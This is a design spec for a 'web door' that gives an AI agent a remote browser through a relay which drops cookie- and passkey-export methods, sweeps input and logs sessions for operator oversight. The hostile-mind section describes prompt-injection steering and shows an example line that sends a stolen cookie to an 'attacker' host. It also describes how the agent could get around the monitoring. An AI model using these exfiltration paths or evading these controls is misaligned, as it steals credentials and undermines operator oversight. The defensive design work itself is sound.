# Spec 0004: The web door

Status: draft. Builds on spec 0001 (doors, the porch, the hostile-mind
doctrine), spec 0002 (per-agent bearers, the vault), and spec 0003 (the
umbilical, the ops gateway, per-wake sub-caps).

**Revision (post-MVP): the container egress FENCE is removed.** A
web-capable container launched with a deny-by-default `allowedHosts`
allowlist, but the fence never closed the real hole (a hijacked mind
exfiltrates through the REMOTE browser regardless, the irreducible
residual below), and it stopped the agent from the ordinary work of
looking things up and pulling packages. So it is burden without benefit.
Egress is now OBSERVE-ONLY: every outbound request the container makes
is intercepted, logged, and forwarded, for later analysis, and nothing
is blocked. The passages below that describe the fence as an active
boundary are superseded by this and section 8; they are kept for the
reasoning, not the mechanism.

## 1. The problem

The mind's "browsing" today is WebFetch and curl: plain HTTP, no
JavaScript, no forms, no logins, no cookies. An agent that earns its
keep on the open web needs a real browser: to create accounts on web
apps (it already receives email, so verification flows close), to sign
in and stay signed in across wakes, to operate dashboards that are
JavaScript all the way down, and to test the sites it publishes.

A browser is also the sharpest tool this system will hand a hostile
mind. It carries logged-in sessions (ambient authority on third-party
sites), it renders attacker-controlled content next to those sessions
(prompt injection with hands), and browser state is a bag of secrets
that must never touch a repo. So the browser is a DOOR, with the same
posture as money and mail: credentials only in Workers, deterministic
policy, everything ledgered, and the operator able to watch.

## 2. Decisions

- **Remote browser only.** No browser is installed in the container.
  Every browser the agent touches is a Cloudflare Browser Run session,
  reached through the gateway below. Testing local code does not weaken
  this: a short-lived Cloudflare Tunnel exposes the container's dev
  server to the remote browser (section 7). One path, one audit trail.
- **CDP is the protocol, the relay is a POLICY POINT.** Browser Run
  exposes a raw Chrome DevTools Protocol WebSocket; every client
  (Playwright, Puppeteer, chrome-devtools-mcp, Stagehand) speaks it,
  and switching providers later is a URL change. But a raw CDP pipe is
  an exfiltration door: `Network.getAllCookies`, `Storage.getCookies`,
  `WebAuthn.getCredentials`, and `Runtime.evaluate("document.cookie")`
  would hand the mind the very session credentials this door protects,
  past every content sweep. So the relay is NOT transparent (section 5,
  "the relay is where policy lives"): it drops credential-export
  methods, owns WebAuthn, and substitutes secrets on injection.
- **MCP is the mind-side surface.** The harness gets a standard browser
  MCP server (chrome-devtools-mcp) pointed at the relay; no bespoke
  browsing tools. Codex speaks MCP too, so the door is harness-portable
  by construction. Scripts are equally welcome: anything in the
  container may connectOverCDP to the same relay endpoint.
- **Named sessions, persisted by the Gatekeeper.** Browser Run sessions
  die (10 minutes idle, max); identity must not. The Gatekeeper
  snapshots storage state (cookies + localStorage + a name) into its
  own Durable Object storage and restores it into the next Browser Run
  session. Never the repo: repo history is forever and cookies are
  credentials.

## 3. The browser Gatekeeper (browser-gk)

One new Worker, one Durable Object class (`WebSession`), one DO
instance per (agent, session name). It is the only holder of the
Cloudflare API token that reaches Browser Run.

Each `WebSession` DO:

- **Opens**: dials `wss://api.cloudflare.com/.../browser-rendering/
  devtools/browser?keep_alive=600000&recording=true` with the
  Worker-held API token and restores the saved storage state (CDP
  `Storage.setCookies` + an init script for localStorage). The values
  stay in browser-gk and Browser Run and never enter the container, so
  door-egress of an extracted value is bounded by where doors go
  (section 5, layer two). Container egress is AUDITED, not fenced
  (section 8, revision note): the browser is the real exfil path, so a
  fence bought nothing. The web door is wired (the BROWSER binding, the
  `web` option) only for web-capable agents.
- **Relays**: pipes CDP frames both ways between the container side and
  Browser Run. The relay is transparent to clients and is where all
  policy lives.
- **Ledgers**: `web_session_open` / `web_session_close`, every
  top-frame navigation (`Page.frameNavigated`), and downloads. The
  ledger is the greppable audit trail; the Browser Run recording
  (`recording=true`) is the full-fidelity replay, viewable in the
  Cloudflare dashboard after the session closes.
- **Snapshots**: on close, wake end, or relay disconnect, exports
  storage state into DO storage under the session name. Open after
  close resumes the same identity.
- **Enforces** (section 5): the per-wake concurrency cap, the optional
  aggregate browser-minute cap when enabled, the origin denylist, and
  the CDP input sweep.

### Provider configuration

The upstream CDP provider is configuration, not code (browser-gk
`provider.ts`): Cloudflare Browser Run is the default, and any other
CDP endpoint plugs in through `WEB_CDP_ENDPOINT` (a `wss://` or
`https://` URL) with an optional `WEB_CDP_TOKEN` bearer. An endpoint
may instead carry its credentials as URL userinfo
(`wss://user:pass@host`); browser-gk moves them into the dial's
`Authorization: Basic` header and strips them from the URL, so no
logged or ledgered URL ever holds them. An endpoint with userinfo AND
a bearer is refused by name (`web_cdp_auth_ambiguous`) rather than
resolved by guess. Everything behind the dial (relay, policy,
identity persistence, metering, screenshots) is provider-neutral CDP;
only the vendor live-view command is gated on the provider name.

### Session naming

Sessions are named by purpose (`x-account`, `github`, `research`), not
per wake. `operon web open <name>` either resumes the saved state under
that name or starts clean. Names are per-agent; two agents can both
have a `github` session with disjoint state. An unnamed quick session
(`operon web open`) gets a wake-scoped name and is never persisted.

## 4. The path: everything through the gateway

```
mind (MCP client or script)
  -> ws://127.0.0.1:<porch>/web/<name>     x-operon-porch header (CSRF fence)
  -> porch (root) relays, adding the per-wake nonce
  -> http://web.operon.internal/<name>      nonce as bearer
  -> umbilical router (WakeContainer)       nonce validated, agent id asserted
  -> browser-gk service binding             real bearer attached
  -> WebSession DO                          policy + ledger + snapshot
  -> wss://api.cloudflare.com/...           Cloudflare API token (Worker-held)
```

The container holds no browser credential of any kind, consistent with
spec 0003 section 4. The porch hop exists because door tokens are held
by the ROOT entrypoint, never the session env (spec 0003 section 5):
the mind cannot skip the porch, and the porch's CSRF header kills
browser-page-origin calls. The relay is a WebSocket end to end; the
porch and umbilical currently speak request/response only, so both grow
a ws-passthrough (the porch already terminates loopback HTTP; a ws
upgrade is an HTTP request).

Risks to spike FIRST: there are TWO undocumented WebSocket links, not
one, and the fallback only covers the first.
1. Container -> umbilical: the ws upgrade through the container
   outbound interception path (`interceptOutboundHttp`). Fallback if it
   does not relay: the porch dials browser-gk's public hostname with a
   root-held door bearer (the pre-umbilical pattern, credential-free
   for the mind). But this fallback REINTRODUCES a container-root door
   token for the life of the feature, so it is a real regression, not a
   free escape hatch, and the spike must report which path it is on.
2. Umbilical -> browser-gk: a ws upgrade over a SERVICE BINDING. If a
   binding does not carry an upgrade, browser-gk needs a public
   hostname reached with the root bearer, which collapses into the same
   regression as (1). The spike must prove this hop too.

Reconnect and keepalive are part of an implementable "session may live
the whole wake". `keep_alive=600000` is an IDLE window, not a lifetime:
Browser Run has no max active lifetime but closes after 10 idle minutes
and on platform releases. So the relay sends a cheap CDP heartbeat
(e.g. `Browser.getVersion`) on an interval inside that window,
snapshots on any drop, and the client reopens transparently. And
`WebSession` itself needs the keepalive `WakeContainer` already uses
(operon#3): a DO that only pipes a socket is otherwise evicted
mid-relay.

## 5. The hostile-mind boundary

The browser inherits spec 0003 section 5's premise: the mind is
assumed steerable by content it reads, and a browser feeds it
attacker-controlled content while holding the agent's logged-in
sessions. The door defends itself:

### The relay is not transparent (credentials do not leave over CDP)

A logged-in session's cookies and passkeys are the credential; the
whole door is pointless if the mind can read them out over CDP and
carry them off. Two layers:

- **Method drop (layer one)**: on the client->upstream direction the
  relay refuses `Network.getCookies`, `Network.getAllCookies`,
  `Storage.getCookies`, `Storage.getStorageKeyForFrame`, and every
  `WebAuthn.*` method, answering the client with a CDP error so its
  request settles. WebAuthn is OWNED by the relay (the virtual
  authenticator, section on passkeys), exactly as the Cloudflare API
  token is; the mind never touches it. This is clean and has no false
  positives.
- **Door egress of an extracted value (layer two)**: `Runtime.evaluate`
  and `Runtime.callFunctionOn` are dual-use (chrome-devtools-mcp needs
  them), so they cannot be dropped, and `document.cookie` / localStorage
  are reachable through them. The wake denylist is NOT the answer here:
  it is a container-local array and browser-gk is a remote Worker with
  no path to it, and the only way to make one would be to ship the
  cookie VALUES into the container, which is the leak. So the container
  never learns the cookie value, and the containment for the value the
  mind DID extract is where the doors GO, not a value sweep:
  - Direct egress is AUDITED, not blocked (section 8): the fence was
    removed (see the revision note at the top), so an extracted value
    can leave the container over ordinary egress, and the record is the
    containment, not prevention. This is deliberate: the remote browser
    is an open exfil path anyway (the irreducible residual below), so
    blocking direct egress bought nothing and cost the agent its normal
    lookups and installs.
  - `notify` lands in front of the OPERATOR; `email` is held and
    swept; `PR` targets an allowlisted repo under operator review; so a
    credential shoved through one of those reaches the operator or a
    reviewed surface, not an attacker.
  - `publish` is the one door with a public destination (the agent's
    own host), so published bytes keep their existing gitleaks +
    denylist sweep, which catches token-SHAPED secrets. A session
    cookie that matches no pattern is the residual, bounded by the
    session recording, the navigation ledger, and the agent's own site
    being monitored. If that residual is judged too sharp for a tenant,
    the deployment can gate `publish` closed while a web session is
    open; that is a policy knob, not a default.

### The remote browser is itself an open-web egress path (irreducible)

The door bounds above are about the CONTAINER. The browser is remote
and on the open web BY DESIGN, so a mind that has read a cookie via
`Runtime.evaluate` can make the BROWSER carry it out:
`Page.navigate("https://attacker/?c=<cookie>")`, or a `fetch()` inside
an `evaluate`. Nothing on the container side sees this; it is Browser
Run's own egress. This is the very reason the container fence was not
worth keeping: the exfil path it left open is the dominant one. This is the confused-deputy limit restated (spec 0003
section 5): a hostile mind wielding the agent's own legitimate browser
cannot be stopped by a network boundary, only bounded and observed. The
layers, honestly labelled as bound-and-detect, not prevent:
- **Bulk export is blocked**: the credential-export CDP methods are
  dropped, so the mind cannot dump the whole cookie jar or the passkeys
  in one call; it is reduced to whatever a single `evaluate` reads.
- **Scoped sessions are fenced at the platform** (this is about the
  REMOTE browser, not the container): a session whose work is one site
  (`x-account`, `github`) is opened with Browser Run `allowedDomainSets`
  pinned to that site's domains, so the remote browser itself cannot
  reach an attacker origin. Only an open-ended `research` session is
  unpinned, and that is the case the next layers cover. This is the one
  place a domain allowlist still earns its keep, because it fences the
  browser (the exfil path), not the container (which never was).
- **The relay checks navigation**: `Page.navigate` targets are matched
  against the origin denylist; a deployment that wants to harden an
  open-ended session can run it denylist-heavy or, in the extreme,
  allowlist-only.
- **Detection, not prevention, for the rest**: the session recording,
  the navigation ledger, the per-wake caps, and delete-session are the
  containment for the residual exactly as they are everywhere the
  hostile-mind doctrine applies. The web door does not claim to prevent
  a steered mind from misusing a session it legitimately holds; no door
  does.

- **Session lifetime and concurrency.** A session may live for the
  WHOLE wake: some work needs a browser open end to end, and the wake
  hard wall is the natural time bound (every session closes and
  snapshots at wake end regardless). The cap that matters is
  CONCURRENCY: at most 3 sessions open at once per wake (env knob;
  one open session is the norm and the doctrine). One `WebMeter` DO
  per agent enforces it, aggregated across named and unnamed sessions
  via short leases keyed by wakeId, so N sessions never dodge the
  limit; it also totals browser-minutes per wake into the ledger for
  observability and cost tracking. The aggregate browser-minutes knob
  is a hard money bound (section 9): DEFAULT ON at 20-30 min/wake for
  the first tenant, looser or off only where an operator has watched
  the ledger and chosen to. The wake wall is the backstop behind it;
  the next wake starts with a clean context either way.
- **Origin denylist** (env, default empty), enforced in TWO places:
  the relay refuses to forward a `Page.navigate` to a denied origin,
  AND the Browser Run session is opened with `allowedDomainSets`
  guardrails (a platform-level layer under the relay), so a denied
  origin is unreachable even if a relay bug lets a navigation slip. The
  list is
  deployment policy, like every cap. An allowlist is deliberately NOT
  the default: the whole point of the door is the open web.
- **CDP input sweep**: `Input.insertText`, `Input.dispatchKeyEvent`
  batches and `Runtime.evaluate` payloads are swept against the secret
  denylist (the gitleaks doctrine, applied to keystrokes) before
  relaying. A mind cannot type the mind credential, a door bearer, or
  a vaulted secret it read into a web form the sweep can see.
- **Sessions are ambient authority.** A logged-in `x-account` session
  can do whatever that account can do, steered or not. Containment is
  the same as every outward door: caps, ledger, recording, live view,
  and the operator's standing ability to delete a session's state
  (which is a logout everywhere it was signed in).
- **No cross-agent reach**: session state is keyed by (agent, name)
  and the umbilical asserts the agent id; agent A cannot open agent
  B's sessions.

### Passwords: placeholder in, injection at the relay

The sweep above forbids typing secret VALUES, which raises the obvious
question: how does the agent enter the password for an account it
created? Answer: it never has the password, in either direction, the
same pattern as the phase-2 mind-credential injection.

- **Mint**: `operon web password <origin>` generates a strong password
  DOOR-SIDE, stores it in the vault under `web/<origin>`, and returns
  only a placeholder token. The mind never sees the value, not even at
  signup, so it cannot leak what it does not hold.
- **Fill**: the mind types the placeholder
  (`{{vault:web/<name>}}`) into the field. The RELAY substitutes the
  real value, but only on a domain the credential is BOUND to.
  Substitution runs on EVERY CDP path that can put text into the page,
  not just `Input.insertText`: `Input.dispatchKeyEvent`,
  `Runtime.evaluate`, `Runtime.callFunctionOn`, and clipboard
  (`Input.dispatchKeyEvent` paste), because Playwright- and
  chrome-devtools-mcp-style `fill` usually goes through
  `element.value = ...` in an evaluate, not synthetic keystrokes.
  Sweep-without-substitute on one path would submit the literal
  placeholder.

  The credential is always injected as DATA, never spliced into
  JavaScript SOURCE. A password holds `'`, `"`, `\`, `${`, newlines;
  concatenating it into an expression string would both corrupt an
  ordinary fill and open a code-injection path. So: on the keystroke
  paths (`insertText`, `dispatchKeyEvent`) the value is already data.
  On `Runtime.callFunctionOn` the relay substitutes an ARGUMENT value
  (a data param in the `arguments` array), never the `functionDeclaration`
  body. A placeholder found INSIDE a raw `Runtime.evaluate` expression
  string is REFUSED, since there is no safe splice of arbitrary data
  into code; the relay's error tells the client to pass the field's
  value through an argument-carrying path (`callFunctionOn` arguments or
  a bound-function fill) instead. The placeholder token itself is chosen
  from a syntax-inert alphabet so it never needs escaping to detect.

  The origin checked is the TARGET EXECUTION CONTEXT's origin, never
  the top-level page's. A `Runtime.evaluate`/`callFunctionOn` carries
  an `executionContextId` (or an `objectId`) that can point at a
  cross-origin iframe: a page from a bound domain can embed an
  attacker's frame, and substituting against the top-level origin would
  inject the real password into the attacker's document. So the relay
  binds against the origin of the exact EXECUTION CONTEXT the fill runs
  in, which it obtains by evaluating `location.origin` IN THAT CONTEXT:
  for an `executionContextId` via `Runtime.evaluate({expression:
  "location.origin", contextId})`, and for an `objectId` via
  `Runtime.callFunctionOn({objectId, functionDeclaration: "function(){
  return location.origin }", returnByValue:true})`, which executes in
  the object's OWN context and so needs no assumption about `this`.
  Neither the session/target origin nor a `this.ownerDocument` probe is
  used: the session is too coarse (site isolation is per-SITE, so a
  same-site cross-origin subframe shares its parent's target) and
  `this` is wrong (a locator fill's `callFunctionOn` runs on a utility
  object with the element as an argument). Running `location.origin` in
  the target context is precise for both. Substitution is REFUSED
  unless that origin is on the bound domain. Anywhere off a bound domain
  the placeholder goes through verbatim: a steered mind cannot be
  phished into entering the GitHub password on a lookalike domain, or
  a bound page's hostile subframe, because the mind does not have it.

### Domain binding (auth hosts are rarely the main host)

Real sign-up and sign-in flows hop hosts: `accounts.google.com` for a
Google product, an Auth0/Okta tenant domain, `id.atlassian.com`, a
`signup.` host distinct from the login host, SSO redirect chains. So
binding is not exact-origin:

- **Registrable domain (eTLD+1) matching**, via the public suffix
  list: `signup.example.com`, `auth.example.com` and `example.com` are
  one binding.
- **Bound by observation, not declaration**: a credential's domain set
  is SEEDED by where the relay actually performed the substitution
  during signup. The relay is present for the whole flow, so a
  password form living on `auth.vendor-idp.com` while the app is
  `app.example.com` binds both, automatically and correctly, with the
  navigation chain ledgered.
- **Automatic seeding is safe because passwords are unique per
  credential**: if the mind is steered into "signing up" on a phishing
  site, the attacker captures a fresh random password to an account
  that exists nowhere else. The dangerous case is an EXISTING
  credential on a NEW domain, and that is exactly what seeding never
  allows.
- **Extending a binding is a held decision**: an existing credential
  filled on an unbound domain (a site migrating auth hosts, or an
  actual phish) is refused at the relay and surfaced to the operator
  through the same notify-with-buttons machinery as email and spend
  holds; approval adds the domain, audited. Rare by construction, so
  the friction lands only where the risk is.
- This keeps the input sweep absolute: there is never a legitimate
  reason for a real secret value in a keystroke. In practice the
  persisted session cookie does most logins and passwords are rare.

The browser session cookie AND the vaulted password together are the
account; deleting both is account abandonment.

### Passkeys first (WebAuthn at the relay)

Passkeys are the PREFERRED credential wherever a site offers them, and
the fit is exact: CDP has a native WebAuthn domain, so the relay
installs a VIRTUAL AUTHENTICATOR into every session
(`WebAuthn.addVirtualAuthenticator`, CTAP2/internal,
automatic presence + user-verified).

- **Registration**: the site prompts for a passkey, the virtual
  authenticator answers, and the relay exports the resulting
  credential (`WebAuthn.getCredentials`) into the session's DO storage
  keyed by rpId, beside the cookies it already keeps. On the next
  session open the relay restores it (`WebAuthn.addCredential`).
- **Sign-in is a click.** No secret is typed, no placeholder, no
  sweep interaction, no OTP dance.
- **Origin binding is cryptographic**, enforced by the protocol
  itself: an assertion is scoped to the rpId, so a lookalike domain
  cannot use the credential at all. Everything the password machinery
  above approximates with domain binding and held decisions, WebAuthn
  provides natively; none of it is needed on the passkey path.
- The mind never holds any part of the credential at any point,
  including enrollment. Doctrine: when a signup or account-settings
  page offers a passkey, take it; passwords are the fallback for sites
  without one.

### OTPs

- **Email codes and magic links** work TODAY: the agent's inbox is the
  email door (`operon email pull`). Codes are short-lived and
  single-use, so reading one from the inbox and typing it is safe; the
  sweep does not apply to ephemeral values.
- **TOTP** (authenticator-app codes): the seed is vaulted at
  enrollment (`operon vault set web-totp/<name>`, through the porch,
  never keystrokes) and codes are minted door-side: `operon web otp
  <name>` returns the current 6-digit code, which is safe to type for
  the same reason email codes are. The seed does transit the session
  once at enrollment (the site displays it); the sweep denylists it
  from that moment, and relay-side DOM extraction is a later
  tightening if that window matters.
- **SMS**: the agent has no phone number. Out of scope for this spec;
  a number-renting door would be its own decision with its own abuse
  surface.

## 6. Operator surface

Through the ops gateway (spec 0003 section 3), new routes:

- `GET /web/sessions`: per agent, the named sessions: name, cookie
  DOMAINS (where it is logged in; never values), created, last used,
  live or saved, minutes used this wake.
- `GET /web/sessions/:name/history`: the navigation ledger for one
  session.
- `POST /web/sessions/:name/delete` (decision, audited): the remote
  logout button. Deletion is three steps in one action, in order:
  terminate any LIVE Browser Run session under the name (close the
  upstream, drop the relay), bump the session's GENERATION counter,
  then drop the saved state. Every snapshot write carries the
  generation it started from and the DO refuses stale ones, so an
  in-flight snapshot-on-close from the killed session cannot write
  the deleted cookies back under the same name. Delete means gone.
- Downloads and uploads are content boundaries. A downloaded file that
  reaches the container is inbound untrusted content (the email/#24
  class): the relay keeps downloads WORKER-side (ledgered, offered to
  the mind only through a door that scans them), never landing raw in
  the container. Uploads (`Page.setFileInputFiles`) can push repo bytes
  into a logged-in third-party origin, so an upload is swept exactly
  like a publish/PR payload (denylist + gitleaks) before it leaves.
- Live sessions: the response includes the Browser Run live-view URL
  (`Cloudflare.getLiveView`), which is watch-and-intervene: the
  operator can see the page the agent sees and take the wheel.
- A recording is rrweb event JSON (DOM mutations, input events,
  navigations), not video and not raw CDP frames; input field content
  is masked by default. Cloudflare retains recordings for only 30 DAYS
  (2-hour cap per session) then deletes them, which is why "never
  deleted" (section 3) requires us to keep our own copy: browser-gk
  FETCHES each recording as JSON on session close (with retry, since a
  recording exists only after close) and ARCHIVES it to R2. The
  Cloudflare dashboard (Browser Run > Runs) is the convenient 30-day
  viewer; the R2 copy plus the ledger is the permanent trail. This is
  MVP, not optional: without it "recordings are never deleted" is
  false, since Cloudflare deletes them.

## 7. Local testing without a local browser

The container gets no browser, but agents build sites and need to see
them rendered. The dev-server path:

- `operon web expose <port>` starts a short-lived Cloudflare quick
  tunnel to a local port. The tunnel client has to run IN the container
  (a Worker cannot reach the container's localhost), so the image gains
  the `cloudflared` binary; quick tunnels need no account credential,
  which keeps the container credential-free. The command yields an
  ephemeral `https://*.trycloudflare.com` URL the remote browser can
  reach.
- If the exposed dev server needs WebSocket/HMR, the tunnel is started
  with `--protocol=http2`: `cloudflared`'s default QUIC path has
  dropped `Upgrade: websocket` in the past.
- The URL is ledgered like a navigation; the tunnel dies with the wake
  (the entrypoint kills it at teardown, same as every wake process).
- This keeps one browser, one audit trail, and adds a bonus: the
  remote browser sees the site exactly as the world will (real TLS,
  real network), which localhost never shows.

Quick tunnels expose the container port to anyone holding the random
URL for the tunnel's lifetime; acceptable for a dev server serving the
agent's own about-to-be-published site, and the wake-scoped teardown
bounds it. If that posture tightens later, a named tunnel on the
operator's account with Access in front is the upgrade path.

## 8. Egress audit: every request the container makes

Today only DOOR traffic passes through the supervisor; npm, git, curl
and WebFetch leave the container directly and unobserved. The same
interception machinery closes that gap:

- `interceptAllOutboundHttp` routes EVERY outbound HTTP request
  through a chassis handler; `interceptOutboundHttps("*")` does the
  same for TLS once the image trusts the Cloudflare containers CA,
  which is the identical CA-trust step the phase-2 mind-credential
  injection already requires. One piece of machinery, two consumers.
- The interceptor is a loopback `EgressAudit` WorkerEntrypoint on the
  `WakeContainer` (via `ctx.exports`, delivering agent + wake id as
  `ctx.props`), pointed at by `interceptOutboundHttps("*")`. It runs in
  the Workers runtime OUTSIDE the container, so the log is unforgeable
  by the container. HTTPS interception needs the container to trust the
  platform's per-instance CA (placed at `/etc/cloudflare/certs`); the
  entrypoint trusts it at startup (system store for curl/git,
  `NODE_EXTRA_CA_CERTS` for node), the same CA-trust the phase-2
  mind-credential injection also needs.
- Each request logs one compact JSON line (`method`, `host`, `path`,
  query LENGTH only since a query string can carry secrets, `status`,
  agent + wake id) via `console`, which Workers observability captures
  and makes queryable. Volume is high (an npm install is thousands of
  requests), which is why the line is compact and the sink is
  observability rather than a DO; batched R2 JSONL for longer retention
  is a later add.
- OBSERVE-ONLY, and FAIL-OPEN: the interceptor logs and forwards, and a
  logging failure never blocks the request. Nothing is blocked, because
  (revision note, top) the fence was removed: the browser is the real
  exfil path, so blocking direct egress was burden without benefit. An
  allow/deny egress POLICY remains a possible future knob, deliberately
  separate from the audit.

### Outbound proxy (optional)

A deployment may route the mind session's plain HTTP egress through an
upstream HTTP proxy (`EGRESS_PROXY` in the scheduler env, delivered to
the container as `OPERON_EGRESS_PROXY`, in the form
`http(s)://[user:pass@]host[:port]`). The credential never enters the
session: the ROOT
entrypoint runs a loopback forwarder beside the porch for exactly the
session's lifetime, chains every request to the upstream with the
credential attached, and hands the session only the loopback address
through the standard variables (`HTTP_PROXY`, `HTTPS_PROXY`,
`NO_PROXY`, plus `NODE_USE_ENV_PROXY` so node clients honour them).
curl, git, npm, WebFetch and scripts route through it unchanged; the
entrypoint's own traffic (clone, doors, persist, notify) does not.

- `CONNECT host:port` (every https URL) is tunnelled through the
  upstream and the sockets spliced: TLS stays end to end between the
  session and the origin, and the forwarder sees hostnames only.
- Absolute-form `http://` requests are forwarded as they arrive.
- The forwarder logs one compact line per tunnel or request (method
  and host, never a path or query), in the egress-audit style above.
- An upstream refusal (a 407, a non-200 CONNECT answer) is reported to
  the session as a 502 gateway failure, never relayed as a challenge:
  the session has no credential to offer and must not be invited to
  look for one.
- Loopback is always direct (the porch and the forwarder live there);
  `EGRESS_PROXY_BYPASS` (comma-separated hosts, `NO_PROXY` syntax)
  names further hosts the session reaches directly. Note that the
  harness's own API traffic rides the proxy too unless bypassed.
- A malformed proxy address fails the wake at config time, by name,
  rather than at the first request.

The platform egress audit (above) still sees every connection the
forwarder makes; with a proxy configured, those connections address
the proxy host, and the forwarder's own log is where the destination
hosts are.

## 9. Costs

Browser Run on Workers Paid includes 10 browser-hours/month. We use
the CDP endpoint + API token, which is the REST/CDP billing path:
DURATION only, $0.09/browser-hour beyond the included 10 h. The $2
per-averaged-concurrent-browser charge is the WORKERS BINDING path
(`launch()` via a Browser binding) and does NOT apply here; do not
treat it as load-bearing unless the door ever switches to a binding.

The concurrency cap bounds hijack blast radius, not the bill: the bill
is hours. Theoretical ceiling is concurrency cap x wake wall x
wakes/day: at 3 concurrent, a 2 h wall and 3 wakes/day that is 18
browser-hours/day, which blows through the included 10 h in under a
day. That is NOT "costs land within the included hours"; it is the
worst case of a lever left wide open. So for the first tenant the
default is the aggregate browser-minutes knob ON at 20-30 min/wake (a
hard money bound), with the concurrency cap and wake wall behind it.
Idle timeout (10 min) means real usage tracks activity and lands well
under the ceiling; the WebMeter's per-wake minute totals in the ledger
are the meter to watch before loosening anything.

## 10. Phasing

1. **Spike**, and its acceptance is not "one page load". Prove:
   (a) the ws upgrade container -> umbilical -> browser-gk -> Browser
   Run over BOTH undocumented links (section 4), or document in writing
   that we are on the public-hostname fallback and have therefore
   reintroduced a container-root door token;
   (b) the relay drops the cookie/passkey export methods;
   (c) an idle heartbeat keeps a quiet session past 10 minutes;
   (d) a disconnect snapshots and a reopen restores cookies;
   (e) an operator delete while the session is live cannot resurrect
   its state.
   No real account is created until (b) holds: never on an unswept,
   unfiltered CDP pipe.
2. **MVP, with the controls, not after them**: browser-gk with
   `WebSession` (open/relay/ledger/snapshot + reconnect/heartbeat), the
   relay POLICY POINT (credential-export method drop, input
   substitution on every text path bound to the target execution
   context's origin, origin denylist + `allowedDomainSets`),
   storage-state persistence,
   recording archived to R2 on close, the concurrency + minute caps,
   `operon web open|sessions|close`, chrome-devtools-mcp staged into
   the harness, ops routes (list + history + delete). The sweep and the
   method filter are NOT a later hardening pass: the first live account
   must be created on a swept, filtered pipe. (Container egress is
   audited, not fenced, section 8.)
3. **Signup flow proven** (the proof those controls work): the agent
   creates one real account end to end (email verification via the
   email door, password minted door-side into the vault, or a passkey),
   operator watches via live view.
4. **Polish**: live-view link in a notify action, tunnel-based local
   testing (`operon web expose`), passkey enrollment path.
5. **Egress audit** (section 8): full-container request logging for ALL
   traffic (npm, git, ordinary API calls) over
   `interceptOutboundHttps("*")`, observe-only and fail-open, once the
   startup CA-trust (shared with mind-credential injection) is in place.
   This REPLACES the removed fence: the record, not a block, is the
   containment for direct egress.

## 11. What this does NOT do

- No local browser in the container (decision, section 2). Playwright
  as a LIBRARY may still be installed for connectOverCDP scripting;
  the Chromium download is not.
- No `--chrome` / Claude in Chrome: that integration requires a
  visible browser and an interactive login session; it is the
  human-paired variant of exactly this door.
- No headful operator puppeteering beyond live view intervene; the
  operator's browser is not part of the chassis.
- No browser for the operator plane itself; the ops gateway remains
  JSON.
